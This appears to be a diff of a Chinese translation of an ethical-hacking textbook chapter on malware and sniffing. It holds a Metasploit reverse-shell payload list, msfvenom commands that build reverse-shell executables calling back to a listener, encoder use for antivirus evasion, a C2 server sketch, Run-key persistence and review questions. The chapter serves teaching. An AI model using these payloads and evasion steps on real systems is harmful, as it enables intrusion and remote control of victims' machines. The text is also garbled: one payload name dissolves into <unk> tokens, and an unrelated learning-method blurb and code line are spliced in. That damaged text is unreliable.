     #   名称                                                     披露日期  排名    检查  描述
+
     -   ----                                                     ---------------  ----    -----  -----------
+
     0   `payload/windows/dllinject/reverse_tcp_allports`                            正常  否     反射 DLL 注入，反向所有端口 TCP 载荷
+
     1   `payload/windows/dllinject/reverse_tcp`                                     正常  否     反射 DLL 注入，反向 TCP 载荷
+
     2   `payload/windows/dllinject/reverse_tcp_dns`                                 正常  否     反射 DLL 注入，反向 TCP 载荷（DNS）
+
     3   `payload/windows/dllinject/reverse_tcp_rc4_dns`                             正常  否     反射 DLL 注入，反向 TCP 载荷（RC4 加密 DNS，Metasm）
+
     4   `payload/windows/dllinject/reverse_tcp_rc4`                                 正常  否     反射 DLL 注入，反向 TCP 载荷（RC4 加密，Metasm）
+
     5   `payload/windows/dllinject/reverse_tcp_uuid`                                正常  否     反射 DLL 注入，反向 TCP 载荷（带 UUID 支持）
-    6   `payload/windows/vncinject/reverse_tcp_allports`                            正常  否     VNC 服务器（反射注入），反向所有端口 TCP 载荷
-    7   `payload/windows/vncinject/reverse_tcp`                                     正常  否     VNC 服务器（反射注入），反向 TCP 载荷
-    8   `payload/windows/vncinject/reverse_tcp_dns`                                 正常  否     VNC 服务器（反射注入），反向 TCP 载荷（DNS）
-    9   `payload/windows/vncinject/reverse_tcp_rc4_dns`                             正常  否     VNC 服务器（反射注入），反向 TCP 载荷（RC4 加密 DNS，Metasm）
-    10  `payload/windows/vncinject/reverse_tcp_rc4`                                 正常  否     VNC 服务器（反射注入），反向 TCP 载荷（RC4 加密，Metasm）
-    11  `payload/windows/vncinject/reverse_tcp_uuid`                                正常  否     VNC 服务器（反射注入），反向 TCP 载荷（带 UUID 支持）
-    12  `payload/windows/shell/reverse_tcp_allports`                                正常  否     Windows 命令行 shell，反向所有端口 TCP 载荷
-    13  `payload/windows/shell_reverse_tcp`                                         正常  否     Windows 命令行 shell，反向内联 TCP
-    14  `payload/windows/shell/reverse_tcp`                                         正常  否     Windows 命令行 shell，反向 TCP 载荷
-    15  `payload/windows/shell/reverse_tcp_dns`                                     正常  否     Windows 命令行 shell，反向 TCP 载荷（DNS）
-    16  `payload/windows/shell/reverse_tcp_rc4_dns`                                 正常  否     Windows 命令行 shell，反向 TCP 载荷（RC4 加密 DNS，Metasm）
-    17  `payload/windows/shell/reverse_tcp_rc4`                                     正常  否     Windows 命令行 shell，反向 TCP 载荷（RC4 加密，Metasm）
-    18  `payload/windows/shell/reverse_tcp_uuid`                                    正常  否     Windows 命令行 shell，反向 TCP 载荷（带 UUID 支持）
-    19  `payload/windows/patchupdllinject/reverse_tcp_allports`                     正常  否     Windows 注入 DLL，反向所有端口 TCP 载荷
-    20  `payload/windows/patchupdllinject/reverse_tcp`                              正常  否     Windows 注入 DLL，反向 TCP 载荷
-    21  `payload/windows/patchupdllinject/reverse_tcp_dns`                          正常  否     Windows 注入 DLL，反向 TCP 载荷（DNS）
-    22  `payload/windows/patchupdllinject/reverse_tcp_rc4_dns`                      正常  否     Windows 注入 DLL，反向 TCP 载荷（RC4 加密 DNS，Metasm）
-    23  `payload/windows/patchupdllinject/reverse_tcp_rc4`                          正常  否     Windows 注入 DLL，反向 TCP 载荷（RC4 加密，Metasm）
-    24  `payload/windows/patchupdllinject/reverse_tcp_uuid`                         正常  否     Windows 注入 DLL，反向 TCP 载荷（带 UUID 支持）
-    25  `payload/windows/peinject/reverse_tcp_allports`                             正常  否     Windows 注入 PE 文件，反向所有端口 TCP 载荷
-    26  `payload/windows/peinject/reverse_tcp`                                      正常  否     Windows 注入 PE 文件，反向 TCP 载荷
-    27  `payload/windows/peinject/reverse_tcp_dns`                                  正常  否     Windows 注入 PE 文件，反向 TCP 载荷（DNS）
-    28  `payload/windows/peinject/reverse_tcp_rc4_dns`                              正常  否     Windows 注入 PE 文件，反向 TCP 载荷（RC4 加密 DNS，Metasm）
-    29  `payload/windows/peinject/reverse_tcp_rc4`                                  正常  否     Windows 注入 PE 文件，反向 TCP 载荷（RC4 加密，Metasm）
-    30  `payload/windows/peinject/reverse_tcp_uuid`                                 正常  否     Windows 注入 PE 文件，反向 TCP 载荷（带 UUID 支持）
-    31  `payload/windows/powershouse<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk>? 
+```
 
 
 
+- 6 `payload/windows/vncinject/reverse_tcp_allports` 正常 否 VNC 服务器（反射注入），反向所有端口 TCP 载荷
+- 7 `payload/windows/vncinject/reverse_tcp` 正常 否 VNC 服务器（反射注入），反向 TCP 载荷
+- 8 `payload/windows/vncinject/reverse_tcp_dns` 正常 否 VNC 服务器（反射注入），反向 TCP 载荷（DNS）
+- 9 `payload/windows/vncinject/reverse_tcp_rc4_dns` 正常 否 VNC 服务器（反射注入），反向 TCP 载荷（RC4 加密 DNS，Metasm）
+- 10 `payload/windows/vncinject/reverse_tcp_rc4` 正常 否 VNC 服务器（反射注入），反向 TCP 载荷（RC4 加密，Metasm）
+- 11 `payload/windows/vncinject/reverse_tcp_uuid` 正常 否 VNC 服务器（反射注入），反向 TCP 载荷（带 UUID 支持）
+- 12 `payload/windows/shell/reverse_tcp_allports` 正常 否 Windows 命令行 shell，反向所有端口 TCP 载荷
+- 13 `payload/windows/shell_reverse_tcp` 正常 否 Windows 命令行 shell，反向内联 TCP
+- 14 `payload/windows/shell/reverse_tcp` 正常 否 Windows 命令行 shell，反向 TCP 载荷
+- 15 `payload/windows/shell/reverse_tcp_dns` 正常 否 Windows 命令行 shell，反向 TCP 载荷（DNS）
+- 16 `payload/windows/shell/reverse_tcp_rc4_dns` 正常 否 Windows 命令行 shell，反向 TCP 载荷（RC4 加密 DNS，Metasm）
+- 17 `payload/windows/shell/reverse_tcp_rc4` 正常 否 Windows 命令行 shell，反向 TCP 载荷（RC4 加密，Metasm）
+- 18 `payload/windows/shell/reverse_tcp_uuid` 正常 否 Windows 命令行 shell，反向 TCP 载荷（带 UUID 支持）
+- 19 `payload/windows/patchupdllinject/reverse_tcp_allports` 正常 否 Windows 注入 DLL，反向所有端口 TCP 载荷
+- 20 `payload/windows/patchupdllinject/reverse_tcp` 正常 否 Windows 注入 DLL，反向 TCP 载荷
+- 21 `payload/windows/patchupdllinject/reverse_tcp_dns` 正常 否 Windows 注入 DLL，反向 TCP 载荷（DNS）
+- 22 `payload/windows/patchupdllinject/reverse_tcp_rc4_dns` 正常 否 Windows 注入 DLL，反向 TCP 载荷（RC4 加密 DNS，Metasm）
+- 23 `payload/windows/patchupdllinject/reverse_tcp_rc4` 正常 否 Windows 注入 DLL，反向 TCP 载荷（RC4 加密，Metasm）
+- 24 `payload/windows/patchupdllinject/reverse_tcp_uuid` 正常 否 Windows 注入 DLL，反向 TCP 载荷（带 UUID 支持）
+- 25 `payload/windows/peinject/reverse_tcp_allports` 正常 否 Windows 注入 PE 文件，反向所有端口 TCP 载荷
+- 26 `payload/windows/peinject/reverse_tcp` 正常 否 Windows 注入 PE 文件，反向 TCP 载荷
+- 27 `payload/windows/peinject/reverse_tcp_dns` 正常 否 Windows 注入 PE 文件，反向 TCP 载荷（DNS）
+- 28 `payload/windows/peinject/reverse_tcp_rc4_dns` 正常 否 Windows 注入 PE 文件，反向 TCP 载荷（RC4 加密 DNS，Metasm）
+- 29 `payload/windows/peinject/reverse_tcp_rc4` 正常 否 Windows 注入 PE 文件，反向 TCP 载荷（RC4 加密，Metasm）
+- 30 `payload/windows/peinject/reverse_tcp_uuid` 正常 否 Windows 注入 PE 文件，反向 TCP 载荷（带 UUID 支持）
+- 31 `payload/windows/powershouse<unk>...?`
 
-当我们创建可执行文件时，我们需要使用 `msfvenom`。它会将一个用 Ruby 编写的负载脚本编译成我们指定的输出文件。下面的列表展示了使用 `msfvenom` 创建 ELF（Executable and Linkable Format）文件的示例。ELF 是 Linux 系统的可执行格式，类似于 Windows 的便携可执行文件（PE）格式。命令行表明我们正在为 x86（32 位）系统生成可执行文件，运行在 Linux 上。负载是通过 TCP 连接的反向 shell，端口为 4444。目标系统位于 127.0.0.1，因为它仅用于连接本地 `netcat` 监听器。输出文件被称为 *payload*，但也可以叫其他任何名字，这便是我们得到的可执行文件名称。输出末尾可以看到该文件是 32 位的 ELF 可执行文件。要在 Linux 系统上运行它，需要设置可执行位。
+当我们创建可执行文件时，我们需要使用 `msfvenom`。它会将一个用 Ruby 编写的负载脚本编译成我们指定的输出文件。下面的列表展示了使用 `msfvenom` 创建 ELF（Executable and Linkable Format）文件的示例。ELF 是 Linux 系统的可执行格式，类似于 Windows 的便携可执行文件（PE）格式。命令行表明我们正在为 x86（32 位）系统生成可执行文件，运行在 Linux 上。负载是通过 TCP 连接的反向 shell，端口为 4444。目标系统位于 127.0.0.1，因为它仅用于连接本地 `netcat` 监听器。输出文件被称为 `payload`，但也可以叫其他任何名字，这便是我们得到的可执行文件名称。输出末尾可以看到该文件是 32 位的 ELF 可执行文件。要在 Linux 系统上运行它，需要设置可执行位。
 
 **使用 `msfvenom`**
 
@@ -7927,7 +8875,7 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
   payload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
 ```
 
-在运行已编译好的 payload 之前，我们需要启动 `netcat` 监听器。下面的代码列表展示了启动 `netcat` 监听指定端口的样子。你会发现 `netcat` 没有任何指示说明它正在监听或已接收连接。因为我同时坐在两端，我知道连接已经建立，于是可以向运行的 payload 程序发送命令。使用类似 Meterpreter shell 和监听器的工具有一个优势：当建立连接时，你可以看到并立即向 payload 发送命令。
+在运行已编译好的 `payload` 之前，我们需要启动 `netcat` 监听器。下面的代码列表展示了启动 `netcat` 监听指定端口的样子。你会发现 `netcat` 没有任何指示说明它正在监听或已接收连接。因为我同时坐在两端，我知道连接已经建立，于是可以向运行的 `payload` 程序发送命令。使用类似 Meterpreter shell 和监听器的工具有一个优势：当建立连接时，你可以看到并立即向 `payload` 发送命令。
 
 **`netcat` 连接**
 
@@ -7958,7 +8906,7 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
  
 ```
 
-你可能会遇到入侵检测系统或防病毒软件捕获你的恶意软件。为了规避，Metasploit 可以对生成的程序进行编码。编码会隐藏实际 payload，使其在程序检测恶意软件时不易被识别。只需在 `msfvenom` 命令行参数中加入常用编码即可。下面的列表展示了添加常见编码的示例。
+你可能会遇到入侵检测系统或防病毒软件捕获你的恶意软件。为了规避，Metasploit 可以对生成的程序进行编码。编码会隐藏实际 `payload`，使其在程序检测恶意软件时不易被识别。只需在 `msfvenom` 命令行参数中加入常用编码即可。下面的列表展示了添加常见编码的示例。
 
 **编码 payload**
 
@@ -7977,7 +8925,7 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
  Saved as: payload
 ```
 
-你可以指定想要使用的编码迭代次数，没有特定的最佳次数。迭代次数越多，payload 在可执行文件中的实际内容就越被隐藏。一次编码已经能够隐藏 payload，但如果有人熟悉经过一次或两次编码的 payload 样子，仍有被捕获的风险。目标是不被捕获并成功运行 payload。
+你可以指定想要使用的编码迭代次数，没有特定的最佳次数。迭代次数越多，`payload` 在可执行文件中的实际内容就越被隐藏。一次编码已经能够隐藏 `payload`，但如果有人熟悉经过一次或两次编码的 `payload` 样子，仍有被捕获的风险。目标是不被捕获并成功运行 `payload`。
 
 ### Obfuscating
 
@@ -7993,13 +8941,11 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.15 lport=443 -e x86/shi
 
 ### Malware Infrastructure
 
-你可能已经注意到，当我们把程序放到目标系统时，通信流的另一端也存在，这使得我们能够继续访问该系统。如果我们只想造成恶意行为，则不重要。我们的目标是在此次感染后继续保持对系统的访问。通常，复杂的恶意软件会有基础设施。我们设置了一个服务器，客户端软件会连接到该服务器以发出命令。这只是野外常见情形的简化版本。你可能已经看到过关于 Mirai 或 Kelihos  botnet 被取下的新闻报道。Botnet 拥有命令与控制（C2）基础设施，允许攻击者向 bot 发送命令，这些 bot 是 botnet 中的端点。图 8.21（Figure 8.21）展示了 botnet 的逻辑结构。
+你可能已经注意到，当我们把程序放到目标系统时，通信流的另一端也存在，这使得我们能够继续访问该系统。如果我们只想造成恶意行为，则不重要。我们的目标是在此次感染后继续保持对系统的访问。通常，复杂的恶意软件会有基础设施。我们设置了一个服务器，客户端软件会连接到该服务器以发出命令。这只是野外常见情形的简化版本。你可能已经看到过关于 Mirai 或 Kelihos botnet 被取下的新闻报道。Botnet 拥有命令与控制（C2）基础设施，允许攻击者向 bot 发送命令，这些 bot 是 botnet 中的端点。图 8.21（Figure 8.21）展示了 botnet 的逻辑结构。
 
 ![FIGURE 8.21 Command‑and‑control infrastructure](img/c08f021.png)
 
 **FIGURE 8.21** Command‑and‑control infrastructure
-
-
 
 这是一个本质上是单层的 C&C 网络。大型僵尸网络（botnet）通常需要多层服务器来控制数百万设备。这可能意味着一个位于顶层的设备，用于管理若干其他设备。这些设备中的每一个可能会管理若干下层设备。攻击者通过与顶层设备进行交互，向终端发送命令，指示其执行什么操作。这可能包括搭建一个网络基础设施用于出售药品，例如。它也可能是发送大量商业电子邮件（UCE，口语中称为垃圾邮件），或发起分布式拒绝服务攻击（DDoS）。
 
@@ -8007,11 +8953,13 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.15 lport=443 -e x86/shi
 
 Node.js 是一种快速搭建 Web 服务器的方法，其中的操作使用 JavaScript 编写。Node.js 拥有大量库，可进一步简化此过程。框架和库会处理所有底层协议交换，你只需编写一些高层代码即可。你可以在 Node.js 中实现 RESTful 服务。REST（Representational State Transfer）是一种管理应用程序状态的方式，弥补了 HTTP 本身不支持的功能。REST 服务使用“端点”来向服务器发送消息并接收响应。端点本质上是一个 URL，指示服务器调用的函数或函数集合。
 
+
+
 在 Node.js 上，你可以使用 Express 库来管理所有的应用通信。你只需编写响应端点调用的代码。这可以通过几行代码完成。当然，运行代码需要你安装 Node.js 以及所需的库。下面的代码片段展示了一个基本的 Node.js 程序，用于处理 `/check` 端点的请求。添加端点只需添加对应的函数即可。
 
-**Node.js 程序用于 RESTful 服务**
+### Node.js 程序用于 RESTful 服务
 
-``` 
+```
 var express = require('express');
 var app = express();
 var fs = require('fs');
@@ -8029,9 +8977,9 @@ var server = app.listen(8081, function() {
 
 这里展示的是一个不执行任何操作的端点。你可以发送请求，但什么也不会发生。要让其产生作用，需要在处理 GET 请求 `/check` 的函数中添加代码。Express 库同样可以处理 POST 请求。要处理 POST，只需使用 `app.post` 替代 `app.get`。你可以返回 JavaScript Object Notation（JSON），它由键（property）和值组成，这对自文档化非常有帮助，因为键值对本身就能提供足够的信息。通过修改 `app.get` 函数，你可以发送 JSON 响应。
 
-**使用 Express 发送响应**
+### 使用 Express 发送响应
 
-``` 
+```
 app.get('/check', function(req, res) {
     res.json({ action: 'email' })
 })
@@ -8055,8 +9003,6 @@ Antivirus 将会是任何编写恶意软件的人的噩梦。幸运的是，如�
 
 ## Persistence
 
-
-
 Malware 是一个并非一次性完成的任务，大部分情况下尤其如此。这尤其适用于恶意软件的目的是为攻击者提供远程访问。攻击者希望恶意软件在登录/退出和重启后继续运行。攻击者可以使用多种技术确保软件始终运行。从启动过程开始，恶意软件可能在操作系统甚至尚未启动前就将自己安装并运行。这使其能够控制启动过程，并在任何防护措施生效前将其加载到内存中。启动前的恶意软件并不常见，但它是最危险的之一，因为它在任何反恶意软件程序启动前就已经运行，从而更难以被检测。
 
 在 Windows 系统中，攻击者可能会使用 Windows 注册表添加键值，使软件在系统启动时自动启动。常用的注册表键有两个。第一个是 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`，它会在系统启动时启动软件。另一个是 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`，该键用于在用户登录时启动程序。该注册表键属于特定用户，因此恶意软件只会在该用户登录时启动，这限制了恶意软件仅限于该用户的权限。首选键是 `HKEY_LOCAL_MACHINE` 下的键，因为它会以机器级权限运行；但有时攻击者只有用户级权限。
@@ -8065,11 +9011,11 @@ Malware 是一个并非一次性完成的任务，大部分情况下尤其如此
 
 还有其他用于持久化的技术。MITRE ATT&CK 框架列出了所有已知的持久化机制，包括操作系统特定的技术（如 Windows Management Instrumentation（WMI）事件订阅）以及跨平台的技术（如启动脚本）。这些技术通常可以被检测，因此攻击者始终在寻找新的持久化技术。
 
-**Summary**
+## Summary
 
 Malware 是信息技术行业的严重问题，影响企业和个人。恶意软件作者通常占据上风。如果他们想保持领先，可以始终在防病毒程序之前将恶意软件植入系统。他们通常利用新恶意软件获得优势，并且可以不断修改恶意软件，使其更难被检测。
 
-这就是恶意软件分析的作用所在。有两种分析方式。第一种是静态分析，它通过查看恶意软件的属性及其实际代码来进行。你可以查看文件的组成，包括 PE 文件中节段的数量和大小。静态分析还可以判断是否为打包可执行文件。一种方法是查看入口点。入口点在编译时确定，基于提供给程序的地址空间。该地址可以被标记，而不仅仅是一个地址。如果你看到入口点名为类似 "UPX" 的名称，你就会知道它已被打包，因为 UPX 是常见的打包工具。反汇编器有助于查看代码以及可执行文件的某些属性。
+这就是恶意软件分析的作用所在。有两种分析方式。第一种是静态分析，它通过查看恶意软件的属性及其实际代码来进行。你可以查看文件的组成，包括 PE 文件中节段的数量和大小。静态分析还可以判断是否为打包可执行文件。一种方法是查看入口点。入口点在编译时确定，基于提供给程序的地址空间。该地址可以被标记，而不仅仅是一个地址。如果你看到入口点名为类似 `UPX` 的名称，你就会知道它已被打包，因为 `UPX` 是常见的打包工具。反汇编器有助于查看代码以及可执行文件的某些属性。
 
 另一种分析方式是动态分析，即运行程序并观察恶意软件的行为。这必须小心进行，因为你不想感染自己的机器，也不想将网络中的其他系统暴露于潜在感染风险。在虚拟机中运行恶意软件可以帮助此目的，尽管某些恶意软件会识别它是否运行在虚拟机中并不会完全展开。你可以使用沙箱环境运行程序，也有沙箱会自动化分析。其中一个是 Cuckoo Sandbox，它可以安装在自己的硬件上，或在公开的在线安装中使用。使用调试器可以帮助进行动态检查，因为你可以控制程序的运行。
 
@@ -8077,152 +9023,107 @@ Malware 是信息技术行业的严重问题，影响企业和个人。恶意软
 
 恶意软件通常会有相关的基础设施。你可能听说过僵尸网络（botnets）。僵尸网络是受感染系统的集合，拥有命令和控制（C2）系统，用于指示僵尸终端执行什么操作。即使没有完整的 C2 系统网络，也至少会有系统供受感染系统连接，以便攻击者进行远程控制。这是因为防火墙通常允许出站流量，而阻止入站流量。因此，最佳做法是从内部发起连接。内部发起连接时，需要一个服务器供内部系统连接。即使只有少数系统，这仍然是基础设施。
 
-**Review Questions**
+## Review Questions
 
 你可以在附录中找到答案。
 
 1. 在僵尸网络中，用于告诉单个僵尸执行什么操作的系统叫什么？
 
    1. `C2 servers`
-
    2. `IRC servers`
-
    3. `HTTP servers`
-
    4. `ISC2 servers`
 
 2. 蠕虫和病毒的主要区别是什么？
 
    1. `A worm uses polymorphic code.`
-
    2. `A virus uses polymorphic code.`
-
    3. `A worm can self‑propagate.`
-
    4. `A virus can self‑propagate.`
 
 3. 静态分析相对于动态分析的一个优势是什么？
 
    1. `Malware is guaranteed to deploy.`
-
    2. `Dynamic analysis is untrustworthy.`
-
    3. `Static analysis limits your exposure to infection.`
-
    4. `Static analysis can be run in virtual machines.`
 
 4. 你会使用 VirusTotal 做什么？
 
    1. `Checking your system for viruses`
-
    2. `Endpoint protection`
-
    3. `As a repository of malware research`
-
    4. `Identifying malware against antivirus engines`
 
 5. 便携式可执行文件（PE 文件）中通常会包含哪两个部分？
 
    1. `Text and binary`
-
    2. `Binary and data`
-
    3. `Addresses and operations`
-
    4. `Text and data`
 
 6. 你可以使用什么来生成自己的恶意软件？
 
    1. `Empire`
-
    2. `Metasploit`
-
    3. `Rcconsole`
-
    4. `IDA Pro`
 
 7. 恶意软件打包工具的作用是什么？
 
    1. `To obscure the actual program`
-
    2. `To ensure that the program is all binary`
-
    3. `To compile the program into a tight space`
-
    4. `To remove null characters`
 
 8. 恶意软件程序的多态代码的主要目的是什么？
 
    1. `Efficiency of execution`
-
    2. `Propagation of the malware`
-
    3. `Antivirus evasion`
-
    4. `Faster compilation`
 
 9. 写恶意软件时不使用 Python 的一个原因是什么？
 
-
-
-
-1. Python 解释器很慢。
-
-2. Python 解释器可能不可用。
-
-3. 库支持不足。
-
-4. Python 是一门难以学习的语言。
+   1. Python 解释器很慢。
+   2. Python 解释器可能不可用。
+   3. 库支持不足。
+   4. Python 是一门难以学习的语言。
 
 10. 你会使用蜂窝沙箱（Cuckoo Sandbox）做什么？
 
-     1. 恶意软件的静态分析
-
-     2. 恶意软件的开发
-
-     3. 恶意软件的动态分析
-
-     4. 恶意软件的手动分析
+    1. 恶意软件的静态分析
+    2. 恶意软件的开发
+    3. 恶意软件的动态分析
+    4. 恶意软件的手动分析
 
 11. 如果你想要一个既能帮助对恶意软件进行静态分析，又能进行动态分析的工具，你会选择哪个？
 
-     1. Cutter
-
-     2. IDA
-
-     3. PE Explorer
-
-     4. MalAlyzer
+    1. Cutter
+    2. IDA
+    3. PE Explorer
+    4. MalAlyzer
 
 12. 使用反汇编器的目的是什么？
 
-     1. 将机码转换为助记符
-
-     2. 将助记符转换为机码
-
-     3. 将助记符翻译为操作
-
-     4. 移除对汇编器的需求
+    1. 将机码转换为助记符
+    2. 将助记符转换为机码
+    3. 将助记符翻译为操作
+    4. 移除对汇编器的需求
 
 13. 所谓“dropping”（投递）的恶意软件会做什么？
 
-     1. 投递防病毒操作
-
-     2. 投递针对恶意执行的 CPU 防护
-
-     3. 投递可能包含更多恶意软件的文件
-
-     4. 将恶意软件投递到回收站
+    1. 投递防病毒操作
+    2. 投递针对恶意执行的 CPU 防护
+    3. 投递可能包含更多恶意软件的文件
+    4. 将恶意软件投递到回收站
 
 14. 在使用 Metasploit 创建恶意软件时，使用编码（encoder）的原因是什么？
 
-     1. 编译恶意软件
-
-     2. 逃避防病毒
-
-     3. 逃避用户检测
-
-     4. 压缩恶意软件
+    1. 编译恶意软件
+    2. 逃避防病毒
+    3. 逃避用户检测
+    4. 压缩恶意软件
 
 15. 如果你看到下面这条命令在别人的历史记录中，你会认为发生了什么？
 
@@ -8230,115 +9131,82 @@ Malware 是信息技术行业的严重问题，影响企业和个人。恶意软
 msfvenom -i 5 -p windows/x64/shell_reverse_tcp -o program
 ```
 
-     1. 创建了一个“中毒药丸”。
-
-     2. 生成了一个恶意程序。
-
-     3. 对已有恶意软件进行了编码。
-
-     4. 启动了 Metasploit。
+    1. 创建了一个“中毒药丸”。
+    2. 生成了一个恶意程序。
+    3. 对已有恶意软件进行了编码。
+    4. 启动了 Metasploit。
 
 16. 病毒（virus）和勒索软件（ransomware）之间的区别是什么？
 
-     1. 勒索软件可能是病毒。
-
-     2. 勒索软件包含比特币。
-
-     3. 勒索软件仅在俄罗斯生成。
-
-     4. 病毒仅在 Windows 系统上运行。
+    1. 勒索软件可能是病毒。
+    2. 勒索软件包含比特币。
+    3. 勒索软件仅在俄罗斯生成。
+    4. 病毒仅在 Windows 系统上运行。
 
 17. 为什么有人会使用木马（Trojan）？
 
-     1. 它作为恶意软件基础设施。
-
-     2. 它逃避防病毒。
-
-     3. 它冒充其他东西。
-
-     4. 它具有多态性。
+    1. 它作为恶意软件基础设施。
+    2. 它逃避防病毒。
+    3. 它冒充其他东西。
+    4. 它具有多态性。
 
 18. 当你试图动态分析恶意软件时，以下工具哪个最有用？
 
-     1. Cutter
-
-     2. OllyDbg
-
-     3. Metasploit
-
-     4. AV‑TEST
+    1. Cutter
+    2. OllyDbg
+    3. Metasploit
+    4. AV‑TEST
 
 19. 如果客户端‑服务器通信中，感染系统上的端点是哪一端？
 
-     1. 客户端
-
-     2. 卫星
-
-     3. 服务器
-
-     4. 主控站
+    1. 客户端
+    2. 卫星
+    3. 服务器
+    4. 主控站
 
 20. 以下哪项是通信最好从已感染网络内部发起的原因？
 
-     1. 防病毒
-
-     2. 虚拟机
-
-     3. 入侵检测
-
-     4. 防火墙
+    1. 防病毒
+    2. 虚拟机
+    3. 入侵检测
+    4. 防火墙
 
 21. 允许软件在系统重启后继续运行的战术叫什么？
 
-     1. 隐藏
-
-     2. 持久化
-
-     3. 反汇编
-
-     4. 打包
+    1. 隐藏
+    2. 持久化
+    3. 反汇编
+    4. 打包
 
 22. 你可以使用哪种工具来深入分析恶意软件？
 
-     1. Strings
-
-     2. 哈希
-
-     3. Ghidra
-
-     4. Metasploit
+    1. `Strings`
+    2. 哈希
+    3. Ghidra
+    4. Metasploit
 
 23. 组织可以采用哪种做法来防止勒索软件导致的数据丢失？
 
-     1. 实施防病毒
-
-     2. 实施终端检测与响应（EDR）
-
-     3. 扫描指标（IOC）
-
-     4. 实施良好的备份实践
+    1. 实施防病毒
+    2. 实施终端检测与响应（EDR）
+    3. 扫描指标（IOC）
+    4. 实施良好的备份实践
 
 24. 在勒索软件攻击后，你可以使用哪种软件来恢复？
 
-     1. 解密工具（Decryptor）
-
-     2. 加密工具（Encryptor）
-
-     3. 防病毒软件
-
-     4. 终端检测与响应（EDR）
+    1. 解密工具（Decryptor）
+    2. 加密工具（Encryptor）
+    3. 防病毒软件
+    4. 终端检测与响应（EDR）
 
 25. 哪种持久化机制可能让恶意软件免受防病毒软件的检测？
 
-     1. 计划任务
+    1. 计划任务
+    2. WMI 事件订阅
+    3. 预启动恶意软件
+    4. `HKEY_LOCAL_MACHINE` 注册表键
 
-     2. WMI 事件订阅
-
-     3. 预启动恶意软件
-
-     4. `HKEY_LOCAL_MACHINE` 注册表键
-
-Sniffing
+## Sniffing
 
 以前，嗅探（sniffing）是一项昂贵的任务。原因在于需要一种专用的网络接口才能捕获数据包。除此之外，还需要相应的软件。如果想要捕获数据包，就必须使用特殊的硬件和软件，而且很少有公司提供这些设备。随后，出现了面向消费者的网络接口，价格相对低廉，能够将所有数据包通过接口转发到操作系统。最终，出现了名为 Ethereal 的软件，使得捕获数据包变得免费。
 
@@ -8346,30 +9214,27 @@ Sniffing
 
 我们还需要处理加密流量。当前大多数网络流量默认使用传输层安全性（TLS）加密，这使得我们难以直接观察数据。不过，仍有一些绕过方法。
 
-Packet Capture
+### Packet Capture
 
 为什么数据包捕获很重要？如果你能在网络的合适位置捕获数据，就有可能获取用户名、密码以及其他身份验证流量。攻击者可以窃取信用卡信息或其他可交易的个人可识别信息（PII）。根据组织类型，还可能涉及个人健康信息（PHI）或其他网络上的有价值数据。捕获数据包是获取这些信息的关键手段。
 
 数据包捕获是指获取目标系统之外的网络流量。虽然可以只捕获发往自身系统的数据包，但这并不有趣，因为这些流量本来就会到达你的系统。网络接口卡（NIC）默认只转发目标 MAC 地址为自身 NIC 的 MAC 地址或广播地址（ff:ff:ff:ff:ff:ff）的帧。要让 NIC 转发所有帧，必须将其置于所谓的混杂模式（promiscuous mode），这样 NIC 就会把所有帧都转发给操作系统，表现得像在“乱逛”一样。
 
+
+
 操作系统的网络栈在收到帧后，可以由一段软件进行拦截。一旦软件拥有帧，数据包捕获工具就会解析并提取每个协议头部的信息。像 `tcpdump` 这样的命令行程序会显示各个头部的内容；也可以使用图形用户界面（GUI），提供更丰富的显示选项，包括协议头和负载数据。
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者 `理查德·费曼`。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上 `20 min` 就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
 我们不必只接受默认的详细程度。我们也可以要求对已捕获的数据包进行更详细的信息。`tcpdump` 支持多个详细程度级别。要获得更详细的信息，我们在命令行中添加 `-v` 参数。如果需要更详细的信息，则使用 `-vv`，再进一步使用 `-vvv`。下面的列表展示了使用 `-vv` 参数的 `tcpdump` 捕获示例。此外，还有一个参数用于将快照长度设置为 0。实际上，这将每个数据包的字节数设置为 262,144，这是默认设置。这并非总是如此。以前，快照长度非常短，因此要获得完整的数据包，需要告诉 `tcpdump` 不要限制捕获的字节数。
 
-**`tcpdump` 捕获附加详细程度**
+## `tcpdump` 捕获附加详细程度
 
 ```
 root@quiche:~# tcpdump -vv -s 0
@@ -8395,11 +9260,11 @@ tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 byt
     root-id 7000.2c:08:8c:1c:3b:db, root-pathcost 0
 ```
 
-默认的 `tcpdump` 设置会显示与数据包相关的 IP 头部信息，即有意义的字段被设置。添加详细程度后，你会看到层 4 头部的详细信息。查看任意 UDP 数据包，会发现会有注释说明校验和（checksum）是否正确，这意味着 `tcpdump` 已经对报文进行了校验和计算，并得到的结果与数据包中的值一致。对于 TCP 段而言，你会看到序列号、确认号以及设置的标志（flags）。
+默认的 `tcpdump` 设置会显示与数据包相关的 IP 头部信息，即有意义的字段被设置。添加详细程度后，你会看到层 4 头部的详细信息。查看任意 UDP 数据包，会发现会有注释说明校验和（`checksum`）是否正确，这意味着 `tcpdump` 已经对报文进行了校验和计算，并得到的结果与数据包中的值一致。对于 TCP 段而言，你会看到序列号、确认号以及设置的标志（`flags`）。
 
